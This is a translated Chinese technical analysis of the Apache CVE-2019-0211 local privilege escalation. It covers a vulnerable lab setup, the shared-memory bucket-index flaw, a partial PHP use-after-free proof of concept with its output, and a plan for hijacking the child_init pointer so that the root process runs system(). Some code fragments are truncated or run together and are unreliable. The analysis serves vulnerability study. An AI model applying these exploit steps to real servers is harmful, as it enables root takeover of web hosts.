# Apache 'logrotate' 本地提权漏洞分析（CVE-2019-0211）
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 1.复现环境搭建
安装虚拟机
[系统镜像下载](https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/18.04/ubuntu-18.04.4-desktop-amd64.iso)
    QEMU安装
    #  创建虚拟机硬盘
    $ qemu-img create -f qcow2 ubuntu18.04.4.img 10G
    # 安装虚拟机
    $ qemu-system-x86_64  -m 2048 -hda ubuntu18.04.4.img -cdrom ./ubuntu-18.04.4-desktop-amd64.iso
    # 启动虚拟机
    $ qemu-system-x86_64 -m 2048  ubuntu18.04.4.i
安装apache
    sudo apt -y install apache2=2.4.29-1ubuntu4 apache2-bin=2.4.29-1ubuntu4 apache2-utils=2.4.29-1ubuntu4 apache2-data=2.4.29-1ubuntu4 apache2-dbg=2.4.29-1ubuntu4
安装php
    sudo apt-get -y install software-properties-common
    sudo add-apt-repository ppa:ondrej/php
    sudo apt-get update
    sudo apt-get -y install php7.1
配置apache
    # Apache监听多个端口(非常重要)
    sudo sed -i 's,Listen 80,Listen 80nListen 8080,' /etc/apache2/ports.conf
启动apache
    $ sudo apachectl restart
    $ ps -axu|grep apache
    root      27041  ...  /usr/sbin/apache2 -k start
    www-data  27042  ...  /usr/sbin/apache2 -k start
    www-data  27043  ...  /usr/sbin/apache2 -k start
    www-data  27044  ...  /usr/sbin/apache2 -k start
    www-data  27045  ...  /usr/sbin/apache2 -k start
    www-data  27046  ...  /usr/sbin/apache2 -k start
## 2\. 漏洞原理概述
  * Apache的主进程会以root权限运行，它会管理一个低权限的worker进程池，这些worker进程用于处理http请求。
  * server进程通过一个位于SHM( shared-memory area) 的scoreboard结构体获取worker进程相关信息。
  * 每个worker进程对这个SHM是可读可写的，它们在SHM中维护一个process_score结构体。
  * process_score结构体包含一个bucket字段，保存的是主进程all_buckets数组的索引值，all_buckets[index]对应的是一个prefork_child_bucket结构体。
  * 当Apache gracefully restart时，会kill掉所有的worker进程，替换成新的woker进程，这个过程会调用prefork_child_bucket->mutext->meth->child_init()函数
  * 由于没有做数组边界检查，恶意的worker进程可以设置任意的bucket值，让其指向一个我们控制的prefork_child_bucket结构体，进而修改prefork_child_bucket->mutex->meth->child_init函数指针，最终当Apache gracefully restart时，会执行修改过的child_init函数，进而可以实现权限提升。
上述提到的相关结构体和进程信息：
    $ ps -aux|grep apache|grep -v grep
    root        780  ... /usr/sbin/apache2 -k start
    www-data  19716  ... /usr/sbin/apache2 -k start
    www-data  19717  ... /usr/sbin/apache2 -k start
    root # cat /proc/780/maps | grep rw-s
    7ff6154be000-7ff615501000 rw-s 00000000 00:01 40010                      /dev/zero (deleted)
    7ff615501000-7ff61557f000 rw-s 00000000 00:01 867451                     /dev/zero (deleted)
    // httpd/include/scoreboard.h 
    typedef struct {
        global_score *global;
        process_score *parent;
        worker_score **servers;
    } scoreboard;
    struct process_score {
        pid_t pid;                                              
        ap_generation_t generation;             
        char quiescing;                                     
        char not_accepting;
        apr_uint32_t connections;
        apr_uint32_t write_completion;
        apr_uint32_t lingering_close;
        apr_uint32_t keep_alive;
        apr_uint32_t suspended;
        int bucket; 
    }
    // httpd/server/mpm/prefork/prefork.c
    typedef struct prefork_child_bucket {
        ap_pod_t *pod;
        ap_listen_rec *listeners;
        apr_proc_mutex_t *mutex;
    } prefork_child_bucket;
    static prefork_child_bucket *all_buckets, /* All listeners buckets */
                                *my_bucket;   /* Current child bucket */
    // apr/include/arch/unix/apr_arch_proc_mutex.h
    struct apr_proc_mutex_t {
        apr_pool_t *pool;
        const apr_proc_mutex_unix_lock_methods_t *meth; 
        int curr_locked;
        char *fname;
        ...
    }
    struct apr_proc_mutex_unix_lock_methods_t {
        unsigned int flags;
        apr_status_t (*create)(apr_proc_mutex_t *, const char *);
        apr_status_t (*acquire)(apr_proc_mutex_t *);
        apr_status_t (*tryacquire)(apr_proc_mutex_t *);
        apr_status_t (*release)(apr_proc_mutex_t *);
        apr_status_t (*cleanup)(void *);
        apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *);  make_child -> child_main -> apr_proc_mutex_child_init -> child_init(&my_bucket->mutex, pool, fname);
    typedef struct prefork_child_bucket {
        ap_pod_t *pod;
        ap_listen_rec *listeners;
        apr_proc_mutex_t *mutex;
    } prefork_child_bucket;
    static prefork_child_bucket *all_buckets, /* All listeners buckets */
                                *my_bucket;   /* Current child bucket */
    static int prefork_run(apr_pool_t *_pconf, apr_pool_t *plog, server_rec *s)
    {
      ...
      apr_proc_t pid;
        ap_wait_or_timeout(&exitwhy, &status, &pid, pconf, ap_server_conf);
      ...
        child_slot = ap_find_child_by_pid(&pid);
      ...   
        make_child(ap_server_conf, child_slot, ap_get_scoreboard_process(child_slot)->bucket);
      ...
    }
    static int make_child(server_rec *s, int slot, int bucket)
    {
        ...
        my_bucket = &all_buckets[bucket];
      ...
      child_main(slot, bucket);
      ...
    }
    static void child_main(int child_num_arg, int child_bucket)
    {
      ...
      status = SAFE_ACCEPT(apr_proc_mutex_child_init(&my_bucket->mutex,
                                        apr_proc_mutex_lockfile(my_bucket->mutex),
                                        pchild));
      ...
    }
    // apr/locks/unix/proc_mutex.c
    // https://github.com/apache/apr/blob/trunk/locks/unix/proc_mutex.c#L1560
    APR_DECLARE(apr_status_t) apr_proc_mutex_child_init(apr_proc_mutex_t **mutex,
                                                        const char *fname,
                                                        apr_pool_t *pool)
    {
        return (*mutex)->meth->child_init(mutex, pool, fname);
    }
## 3\. PoC原理
这里只是简单说一下PHP UAF的PoC
    $ cat uaf.php 
    >= 8;
        }
        return $out;
    }
    class Z implements JsonSerializable
    {
        public function jsonSerialize()
        {
            global $y, $addresses, $workers_pids;
            $_protector = ptr2str(0, 78);
            $this->abc = ptr2str(0, 79);
            $p = new DateInterval('PT1S');
            unset($y[0]);
            unset($p);
            $protector = ".$_protector";
            $x = new DateInterval('PT1S');
            $x->y = 0x00;
            # zend_string.len
            $x->d = 0x100;
            # zend_string.val[0-4]
            $x->h = 0x13121110;
            # Verify UAF was successful
            # We modified stuff via $x; they should be visible by $this->abc, since
            # they are at the same memory location.
            if(!(
                strlen($this->abc) === $x->d &&
                $this->abc[0] == "x10" &&
                $this->abc[1] == "x11" &&
                $this->abc[2] == "x12" &&
                $this->abc[3] == "x13"
            ))
            {
                o('UAF failed, exiting.');
                exit();
            }
            o('UAF successful.');
            o('');
        }
    }
    function test_uaf()
    {
        global $y;
        $y = [new Z()];
        json_encode([0 => &$y]);
    }
    test_uaf();
    ?>
    $ php -v
    PHP 7.2.13 (cli) (built: Apr 28 2020 20:54:07) ( NTS )
    Copyright (c) 1997-2018 The PHP Group
    Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
    $ php uaf.php 
    UAF successful.
通过DateInterval对象$x操纵已经释放的zend_string对象$this->abc，然后通过$x控制$this->abc的长度(php内部结构体zend_string的len字段，在php代码中是不可修改的)。
需要注意一点：$this->abc是创建的当前对象的成员变量，内存空间会随着当前对象的释放一起释放，但是`$_protector`这样的函数局部变量不会。
DateInterval内部实现包含一个timelib_rel_time结构体，它的大小跟创建的zend_string属于同一个fastbin(0x70)
    #include 
    typedef signed long long timelib_sll;
    typedef struct _timelib_rel_time {
        timelib_sll y, m, d; /* Years, Months and Days */
        timelib_sll h, i, s; /* Hours, mInutes and Seconds */
        timelib_sll us;      /* Microseconds */
        int weekday; 
        int weekday_behavior; 
        int first_last_day_of;
        int invert; 
        timelib_sll days; 
        struct {
            unsigned int type;
            timelib_sll amount;
        } special;
        unsigned int   have_weekday_relative, have_special_relative;
    } timelib_rel_time;
    int main(){
        printf("%lun", sizeof(timelib_rel_time));
    }
    $ ./a.out
    104
这部分内容由于没有弄好PHP内核调试环境，还有待补充和校验，欢迎大佬们给出些建议。
## 4\. EXP原理
###  漏洞利用思路
通过worker进程在SHM中构造prefork_child_bucket结构体，使prefork_child_bucket.mutex->meth的child_init函数指针指向zend_object_std_dtor函数；
    typedef struct prefork_child_bucket {
        ap_pod_t *pod;
        ap_listen_rec *listeners;
        apr_proc_mutex_t *mutex;
    } prefork_child_bucket;
    struct apr_proc_mutex_t {
        apr_pool_t *pool;
        const apr_proc_mutex_unix_lock_methods_t *meth;
        ...
    }
    struct apr_proc_mutex_unix_lock_methods_t {
        unsigned int flags;
        apr_status_t (*create)(apr_proc_mutex_t *, const char *);
        apr_status_t (*acquire)(apr_proc_mutex_t *);
        apr_status_t (*tryacquire)(apr_proc_mutex_t *);
        apr_status_t (*release)(apr_proc_mutex_t *);
        apr_status_t (*cleanup)(void *);
        apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); mutex)修改为zend_object_std_dtor的参数(`zend_object
*object`)，并借助zend_object_std_dtor执行system函数；
    typedef struct _zend_object     zend_object;
    struct _zend_object {
        zend_refcounted_h gc;           //  8字节
        uint32_t          handle; 
        zend_class_entry *ce;
        const zend_object_handlers *handlers;
        HashTable        *properties;
        zval              properties_table[1];
    };
    typedef struct _zend_array HashTable;
    struct _zend_array {
        zend_refcounted_h gc;  // 8字节
        union {                // 4字节
            struct {
    ...
            } v;
            uint32_t flags;
        } u;
        uint32_t          nTableMask;
        Bucket           *arData;
        uint32_t          nNumUsed;
        uint32_t          nNumOfElements;
        uint32_t          nTableSize;
        uint32_t          nInternalPointer;
        zend_long         nNextFreeElement;
        dtor_func_t       pDestructor;
    };
    typedef struct _Bucket {
        zval              val;
        zend_ulong        h;                /* hash value (or numeric index)   */
        zend_string      *key;              /* string key or NULL for numerics */
    } Bucket;
修改worker进程的process_score->bucket（ => index） 使Apache主进程的 all_buckets[index]
指向我们构造的 prefork_child_bucket结构体；  
进而将正常执行流程:
    prefork_run -> make_child -> child_main -> apr_proc_mutex_child_init -> child_init(&my_bucket->mutex, pool, fname);
替换为：
    prefork_run -> make_child -> child_main -> apr_proc_mutex_child_init -> zend_object_std_dtor(&my_bucket->mutex) -> system("system cmd")
劫持后的代码流程：
    ZEND_API void zend_object_std_dtor(zend_object *object)
    {
        ...
        zend_array_destroy(object->properties);
        ... 
    }
    ZEND_API void ZEND_FASTCALL zend_array_destroy(HashTable *ht)
    {
      ...
      zend_hash_destroy(ht);
      ...
    }
    ZEND_API void ZEND_FASTCALL zend_hash_destroy(HashTable *ht)
    {
        Bucket *p, *end;
        ...
        p = ht->arData;
        ...
        ht->pDestructor(&p->val);
        ...
    }
    ZEND_API void zend_object_std_dtor(zend_object *object)
        -> zend_array_destroy(object->properties);
            -> zend_hash_destroy(object->properties);
                -> system(&object->properties->arData->val)
    (char *)&object->properties->arData->val 等同于 (char *)arData